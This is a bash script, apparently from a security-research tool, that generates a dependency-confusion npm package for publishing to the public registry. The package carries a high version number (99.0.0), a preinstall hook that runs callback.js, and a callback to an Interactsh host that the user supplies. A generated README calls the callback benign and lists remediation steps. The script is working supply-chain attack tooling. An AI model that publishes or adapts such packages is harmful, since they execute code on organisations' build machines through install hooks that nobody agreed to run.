#!/bin/bash

# Dependency Confusion PoC Generator
# Author: OFJAAAH
#
# Usage: ./generate-poc.sh <package-name> <interactsh-url>
# Example: ./generate-poc.sh vulncorp-internal-lib abc123.oast.fun

set -e

PACKAGE_NAME=$1
CALLBACK_URL=$2

if [ -z "$PACKAGE_NAME" ]; then
    echo "Usage: $0 <package-name> <interactsh-url>"
    echo ""
    echo "Example:"
    echo "  $0 vulncorp-internal-lib https://abc123.oast.fun"
    echo ""
    echo "To get an Interactsh URL:"
    echo "  1. Install: go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"
    echo "  2. Run: interactsh-client"
    echo "  3. Copy the generated URL"
    exit 1
fi

if [ -z "$CALLBACK_URL" ]; then
    echo "Warning: No callback URL provided. Package will only print message."
    CALLBACK_URL="REPLACE_WITH_INTERACTSH_URL"
fi

# Create output directory
OUTPUT_DIR="./output/${PACKAGE_NAME}"
mkdir -p "$OUTPUT_DIR"

echo "Generating PoC package for: $PACKAGE_NAME"
echo "Callback URL: $CALLBACK_URL"
echo ""

# Generate package.json
cat > "$OUTPUT_DIR/package.json" << EOF
{
  "name": "${PACKAGE_NAME}",
  "version": "99.0.0",
  "description": "Security research - Dependency Confusion PoC by OFJAAAH",
  "main": "index.js",
  "scripts": {
    "preinstall": "node callback.js || true"
  },
  "keywords": ["security", "research", "dependency-confusion"],
  "author": "OFJAAAH - Security Research",
  "license": "MIT"
}
EOF

# Generate callback.js with the URL
sed "s|REPLACE_WITH_INTERACTSH_URL|${CALLBACK_URL}|g" callback.js > "$OUTPUT_DIR/callback.js"

# Copy index.js
cp index.js "$OUTPUT_DIR/index.js"

# Create README
cat > "$OUTPUT_DIR/README.md" << EOF
# ${PACKAGE_NAME}

## Security Research - Dependency Confusion PoC

This package is part of authorized security research testing for dependency confusion vulnerabilities.

**Author:** OFJAAAH
**Tool:** Dependency Confusion Hunter

### What This Package Does

1. Prints a warning message during \`npm install\`
2. Sends a benign callback to verify code execution
3. Does NOT collect sensitive data or credentials

### If You See This Package

If this package was installed in your environment, it means:

1. Your build system fetched this package from npm instead of your private registry
2. You may be vulnerable to dependency confusion attacks
3. You should review your \`.npmrc\` configuration and registry settings

### Remediation

1. Use scoped packages (\`@yourorg/package-name\`)
2. Configure \`.npmrc\` to use your private registry for internal packages
3. Use package-lock.json with integrity checks
4. Consider using npm's \`--registry\` flag for private packages

### Contact

For questions about this security research, contact OFJAAAH.
EOF

echo ""
echo "PoC package generated in: $OUTPUT_DIR"
echo ""
echo "To publish (requires npm account):"
echo "  cd $OUTPUT_DIR"
echo "  npm publish"
echo ""
echo "To test locally:"
echo "  cd $OUTPUT_DIR"
echo "  npm pack"
echo ""
